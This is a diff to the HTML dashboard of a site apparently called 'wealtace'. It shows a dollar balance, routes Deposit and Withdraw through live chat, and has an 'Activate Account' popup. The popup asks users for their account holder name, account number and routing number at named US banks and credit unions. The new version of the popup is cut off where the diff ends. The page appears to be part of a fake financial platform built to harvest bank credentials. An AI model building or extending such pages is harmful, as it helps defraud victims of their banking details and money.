@@ -13,6 +13,7 @@ body{background:var(--bg)}
 .btn-deposit{background:var(--green)}.btn-withdraw{background:var(--red)}.btn-activate{background:var(--blue)}
 .popup{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);justify-content:center;align-items:center;z-index:999}
 .popup-box{background:#fff;padding:30px;border-radius:15px;max-width:450px;width:90%;border-top:5px solid var(--red)}
+.popup-box h3{color:var(--blue);margin-bottom:15px;text-align:center}
 .popup-box input,.popup-box select{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:16px}
 </style>
 </head><body>
@@ -33,68 +34,10 @@ body{background:var(--bg)}
 <div class="balance" id="userBalance">$0.00</div>
 </div>
 
-<button class="btn btn-deposit" onclick="alert('Contact support via chat')">💰 Deposit</button>
-<button class="btn btn-withdraw" onclick="alert('Contact support via chat')">🏦 Withdraw</button>
+<button class="btn btn-deposit" onclick="Tawk_API.toggle()">💰 Deposit</button>
+<button class="btn btn-withdraw" onclick="Tawk_API.toggle()">🏦 Withdraw</button>
 <button class="btn btn-activate" onclick="openActivate()">⚡ Activate Account</button>
 </div>
 
-<!-- ACTIVATE POPUP -->
-<div class="popup" id="activatePopup">
-<div class="popup-box">
-<h3 style="color:var(--blue);text-align:center">Activate Account - Bank Details</h3>
-<form onsubmit="submitActivate(event)">
-<select id="bankType" required>
-<option value="">-- Select Bank/Credit Union --</option>
-<option>Huntington Bank</option>
-<option>Abri Credit Union</option>
-<option>GLCU Credit Union</option>
-</select>
-<input type="text" id="accName" placeholder="Account Holder Name" required>
-<input type="text" id="accNumber" placeholder="Account Number" required>
-<input type="text" id="routingNumber" placeholder="Routing Number" required>
-<button class="btn btn-activate">Submit for Activation</button>
-<button type="button" class="btn" style="background:#999" onclick="closeActivate()">Cancel</button>
-</form>
-</div>
-</div>
-
-<script>
-// ALL CODE IS HERE INSIDE HTML. NO.JS FILE NEEDED
-let currentUser = JSON.parse(localStorage.getItem('wealtace_current_user'));
-if(!currentUser){ window.location.href = 'index.html'; }
-let users = JSON.parse(localStorage.getItem('wealtace_users')) || [];
-let user = users.find(u => u.email === currentUser.email);
-document.getElementById('userName').innerText = 'Welcome, ' + user.name;
-document.getElementById('userEmail').innerText = user.email;
-document.getElementById('userBalance').innerText = '$' + (user.balance || 0).toFixed(2);
-
-function openActivate(){ document.getElementById('activatePopup').style.display='flex'; }
-function closeActivate(){ document.getElementById('activatePopup').style.display='none'; }
-
-function submitActivate(e){
-e.preventDefault();
-let activations = JSON.parse(localStorage.getItem('wealtace_activations')) || [];
-activations.push({
-email:user.email,
-bank:document.getElementById('bankType').value,
-name:document.getElementById('accName').value,
-acc:document.getElementById('accNumber').value,
-routing:document.getElementById('routingNumber').value,
-date:new Date().toLocaleString()
-});
-localStorage.setItem('wealtace_activations', JSON.stringify(activations));
-alert('Activation Request Submitted!');
-closeActivate();
-}
-</script>
-
-<!-- Tawk.to Chat -->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;s1.src='https://embed.tawk.to/6a7ba18a828a5d1d4789913b/1jvpeu22f';
-s1.charset='UTF-8';s1.setAttribute('crossorigin','*');s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-</body></html>
+<!-- ACTIVATE POPUP WITH ALL BANKS -->
+<div class="popup"
